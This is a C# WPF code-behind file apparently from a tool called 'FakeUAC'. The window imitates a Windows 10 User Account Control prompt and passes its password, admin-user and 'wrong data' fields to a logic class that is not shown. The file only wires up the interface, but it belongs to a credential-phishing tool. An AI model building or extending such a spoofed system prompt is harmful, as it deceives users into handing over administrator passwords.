using System.ComponentModel;
using System.Windows;
using System.Windows.Input;

namespace FakeUAC
{
	public partial class Windows10 : Window
	{
		private MainLogic logic = new MainLogic();
		public Windows10()
		{
			InitializeComponent();
			logic.Init(this, icon, password, title, question, exeName, publisher, origin, showMore, programLoc, continueText, moreOptions, yes, no, wrongData, null, admin_user, admin_user_path);
		}
		private void ShowMore(object sender, MouseButtonEventArgs e) => logic.ShowMore(sender, e);
		private void Confirm(object sender, RoutedEventArgs e) => logic.Confirm(sender, e);
		private void Close(object sender, MouseButtonEventArgs e) => logic.Close(sender, e);
		private void Cancel(object sender, RoutedEventArgs e) => logic.Exit();
		private void OnExit(object sender, CancelEventArgs e) => logic.OnExit(sender, e);
	}
}